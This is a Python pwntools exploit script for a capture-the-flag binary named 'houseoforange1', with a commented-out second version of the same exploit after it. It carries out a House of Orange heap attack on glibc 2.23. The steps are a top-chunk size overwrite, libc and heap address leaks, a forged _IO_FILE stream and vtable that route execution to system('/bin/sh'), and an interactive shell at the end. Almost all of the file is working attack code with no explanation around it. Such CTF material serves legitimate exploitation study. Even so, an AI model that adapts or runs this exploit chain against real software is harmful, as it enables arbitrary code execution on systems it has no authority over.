#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './houseoforange1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.23.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('node4.buuoj.cn', '26583')


def debug():
    gdb.attach(p)
    pause()

bps = [0xD68,0xDA5,0xE08]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('oice : ')

def create(size, name):
    eat()
    p.sendline('1')
    p.recvuntil('f name :')
    p.sendline(str(size))
    p.recvuntil('Name :')
    p.send(name)
    p.recvuntil('ice of Orange:')
    p.sendline(str(1))
    p.recvuntil('lor of Orange:')
    p.sendline(str(1))

def show():
    eat()
    p.sendline('2')

def edit(name):
    eat()
    p.sendline('3')
    p.recvuntil('f name :')
    p.sendline(str(len(name)))
    p.recvuntil('Name:')
    p.send(name)
    p.recvuntil('ice of Orange:')
    p.sendline(str(1))
    p.recvuntil('lor of Orange:')
    p.sendline(str(1))

create(0x80,'1234')
payload = b'a'*0x80
payload += p64(0)+p64(0x21)
payload += p64(0)*2
payload += p64(0) + p64(0xf31)
edit(payload)

create(0x1000,'aaaa')


create(0x400,'aaaaaaaa')
show()
p.recvuntil("a"*0x8)
unsorted_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.success("unsorted_addr: "+hex(unsorted_addr))
libc.address = unsorted_addr-0x3c5188
log.success("libc.address: "+hex(libc.address))


edit('a'*0x10)
show()
p.recvuntil("a"*16)
heap_base = u64(p.recv(6).ljust(8, b"\x00"))-0x30-0x100
log.success("heap_base: "+hex(heap_base))

io_list_all = libc.symbols['_IO_list_all']
log.success("io_list_all: "+hex(io_list_all))
system = libc.symbols['system']
log.success("system: "+hex(system))

# vtable_addr = heap_base + 0x658
# log.success("vtable_addr: "+hex(vtable_addr))

vtable_addr = heap_base + 0x640
log.success("vtable_addr: "+hex(vtable_addr))
_wide_data_ptr = heap_base + 0x630
log.success("_wide_data_ptr: "+hex(_wide_data_ptr))

padding = b'a'*0x400
padding += p64(0)+p64(0x21)
padding += p64(0)*2

# stream
# stream = b'/bin/sh\x00' + p64(0x61)
# stream += p64(0) + p64(io_list_all-0x10)# fd bk
# stream = stream.ljust(0xa0,b"\x00")
# stream += p64(_wide_data_ptr)# _wide_data_ptr
# stream = stream.ljust(0xc0,b"\x00")
# stream += p32(1)# mode

# payload = p32(0)
# payload += p64(0)
# payload += p64(0)# <-- _wide_data_ptr

# payload += p64(vtable_addr)
# payload += p64(0)# padding
# payload += p64(2)# fp->_wide_data->_IO_write_base
# payload += p64(3)# fp->_wide_data->_IO_write_ptr
# payload += p64(0)*3 # vtable [0] [1] [2]
# payload += p64(system)# [3]

stream = b'/bin/sh\x00' + p64(0x61)
stream += p64(0) + p64(io_list_all - 0x10)
stream += p64(0) + p64(1) #_IO_write_base < _IO_write_ptr
stream = stream.ljust(0xc0,b'\x00') #bypass lots of things
stream += p32(0) #_mode<=0
stream += p32(0) + p64(0) * 2 #bypass _unused2

payload = p64(vtable_addr) #vtable_addr
payload += p64(0) * 3 #bypass
payload += p64(system)

edit(padding + stream + payload)
debug()
eat()
p.sendline('1')#! 因为 bk 指向 io_list_all-0x10，要对它进行解链，malloc 失败，直接 abort

log.success("libc.address: "+hex(libc.address))

p.interactive()



# #! /usr/bin/env python3
# from pwn import *
#
# arch = 64
# challenge = './houseoforange1'
#
# context.os='linux'
# context.log_level = 'debug'
# if arch==64:
#     context.arch='amd64'
# if arch==32:
#     context.arch='i386'
# context.terminal = ['tmux', 'splitw', '-h']
# elf = ELF(challenge)
# libc = ELF('libc-2.23.so')
#
# local = 1
# if local:
#     p = process(challenge)
# else:
#     p = remote('node4.buuoj.cn', '28984')
#
#
# def debug():
#     gdb.attach(p)
#     pause()
#
# bps = [0xD68,0xDA5,0xE08]
# pie = 1
# def gdba():
#     if local == 0:
#         return 0
#     cmd ='set follow-fork-mode parent\n'
#     #cmd=''
#     if pie:
#         base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
#         cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
#         cmd += 'set $base={:#x}\n'.format(base)
#     else:
#         cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
#
#     gdb.attach(p,cmd)
#
# def eat():
#     p.recvuntil('oice : ')
#
# def create(size, name):
#     eat()
#     p.sendline('1')
#     p.recvuntil('f name :')
#     p.sendline(str(size))
#     p.recvuntil('Name :')
#     p.send(name)
#     p.recvuntil('ice of Orange:')
#     p.sendline(str(1))
#     p.recvuntil('lor of Orange:')
#     p.sendline(str(1))
#
# def show():
#     eat()
#     p.sendline('2')
#
# def edit(name):
#     eat()
#     p.sendline('3')
#     p.recvuntil('f name :')
#     p.sendline(str(len(name)))
#     p.recvuntil('Name:')
#     p.send(name)
#     p.recvuntil('ice of Orange:')
#     p.sendline(str(1))
#     p.recvuntil('lor of Orange:')
#     p.sendline(str(1))
#
# create(0x80,"ddaa")
#
# payload = b"a"*0x80
# payload += p64(0) + p64(0x21)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0xf31)# forge top size
# edit(payload)# overwrite the size of top
#
# # 0xed0
# create(0x1000,"qqqqq") # trigger the _int_free in sysmalloc
#
#
# # leak_libc
# create(0x400,"aaaaaaaa") # create a large chunk and Leak the address of libc
# show()
# p.recvuntil("a"*0x8)
# # p.recvuntil('\n')
# unsorted_addr = u64(p.recv(6).ljust(8, b"\x00"))
# libc.address = unsorted_addr-0x3c5188
# log.success("libc.address: "+hex(libc.address))
#
# # leak_heapbase
# edit("c"*16) # Leak the address of heap
# show()
# p.recvuntil("c"*16)
# heap_base = u64(p.recv(6).ljust(8, b"\x00"))-0x30-0x100
# log.success("heap_base: "+hex(heap_base))
#
# io_list_all = libc.symbols['_IO_list_all']
# log.success("io_list_all: "+hex(io_list_all))
# system = libc.symbols['system']
# log.success("system: "+hex(system))
# vtable_addr = heap_base + 0x728-0xd0
# log.success("vtable_addr: "+hex(vtable_addr))
# _wide_data_ptr = heap_base + 0x6e0
# log.success("_wide_data_ptr: "+hex(_wide_data_ptr))
#
# padding = b'a'*0x400
# padding += p64(0)+p64(0x21)
# padding += p64(0)*2
#
# # stream
# stream = b'/bin/sh\x00' + p64(0x61)
# stream += p64(0) + p64(io_list_all-0x10)# fd bk
# stream = stream.ljust(0xa0,b"\x00")
# stream += p64(vtable_addr-0x28)# _wide_data_ptr
# stream = stream.ljust(0xc0,b"\x00")
# stream += p32(1)# mode
#
# payload = p32(0)
# payload += p64(0)
# payload += p64(0)# <-- _wide_data_ptr
# payload += p64(vtable_addr)
# payload += p64(0)# padding
# payload += p64(2)# fp->_wide_data->_IO_write_base
# payload += p64(3)# fp->_wide_data->_IO_write_ptr
# payload += p64(0)*3 # vtable [0] [1] [2]
# payload += p64(system)# [3]
#
# edit(padding + stream + payload)
#
# p.recvuntil(":")
# p.sendline("1") # trigger malloc and abort 因为 unsorted 的 fd 和 bk 烂掉了，所以触发 abort
# log.success("libc.address: "+hex(libc.address))# 二分之一的概率
#
# p.interactive()
